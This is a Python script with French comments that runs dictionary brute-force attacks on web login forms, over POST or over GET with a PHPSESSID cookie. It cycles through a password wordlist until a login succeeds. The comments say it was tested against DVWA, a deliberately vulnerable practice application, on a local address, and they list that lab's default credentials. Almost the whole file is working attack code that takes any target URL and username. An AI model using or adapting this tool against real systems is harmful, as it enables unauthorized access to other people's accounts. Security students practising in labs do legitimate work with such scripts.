import requests

#je teste ce script sur DVWA dont les credentials sont :
#username : username    password : password
#C:\Users\amine\Desktop\projet attaque auto python\dico_dvwa.txt
#test 2 : http://192.168.1.42/dvwa/vulnerabilities/brute/
#http://192.168.1.42/dvwa/login.php

#let's define the web page to attack

def main():
    global choix

    choix = input("""\n
    1 - Attaque par dictionnaire (POST)
    2 - Attaque par dictionnaire (GET)
    3 - Quitter \n
    \n
    Entrez un chiffre : """)


def attaque_dico_post():
    url = input("Entrez l'url à attaquer : ")
    username = input("Entrer le username du compte : ")
    dico_fichier = input("Entrer le chemin du fichier contenant les mdp à tester : ")
    #On ouvre en mode read le fichier ainsi renseigné
    fichier = open(dico_fichier, "r")
    #mtn on crée une boucle qui récupère chaque mdp dans le fichier ainsi ouvert
    
    for mdp in fichier.readlines():
        #mtn on recupere chaque mdp depuis le fichier dico
        #on retire tous les \n
        mdp=mdp.strip("\n")
        #après s'etre renseigné sur navigateur avec "inspecter l'élément"
        data = {'username':username, 'password':mdp, "Login":'submit'}
        envoi_data = requests.post(url, data=data)
        
        print(str(envoi_data.content)) #à retirer ensuite

        if "Login failed" in str(envoi_data.content):
            print('\033[91m'"[*] Tentative mdp: %s" % mdp)
        else:
            print('\033[92m' "[*] Mdp découvert: %s " % mdp)
            print('\033[0m' "Le mot de passe trouvé par le script est : " + mdp)
            break



def attaque_dico_get():
    url = input("Entrez l'url à attaquer : ")
    username = input("Entrer le username du compte : ")
    cookie_val = input("Entrer valeur du cookie du site : ")
    dico_fichier = input("Entrer le chemin du fichier contenant les mdp à tester : ")
    liste_mdp = []
    #on ouvre le txt et recupère chaque mdp depui le dico
    fichier = open(dico_fichier, "r")
    for mdp in fichier.readlines():
        #mtn on recupere chaque mdp depuis le fichier dico
        #on retire tous les \n
        mdp=mdp.strip("\n")
        #On ajoute tout les mdp du fichiers dans une liste
        liste_mdp.append(mdp)
    #On renseigne le cookie et le security lvl pour avoir une rep correcte
    cookies = {'PHPSESSID' : str(cookie_val)}

    for password in liste_mdp :
        print('\033[91m'f"Tentative du mdp : {password}")
        payload = f'?username={username}&password={password}&Login=Login'
        requete = requests.get(url + payload, cookies=cookies)
        if not 'incorrect' in requete.text:
            print('\033[92m'"[*] Mdp découvert: %s " % password)
            break


def erreur():
    print("Fermeture...")
    quit()



main()
if str(choix) == "1":
    #fonction 1 sera utilisée pour l'appel de la fonction attaque_dico
    attaque_dico_post()
elif str(choix) == "2":
    #fonction 1 sera utilisée pour l'appel de la fonction attaque_dico
    attaque_dico_get()
else :
    #la fonction 3 permet de quitter le script si 3 choisi ou en cas d'erreur
    erreur()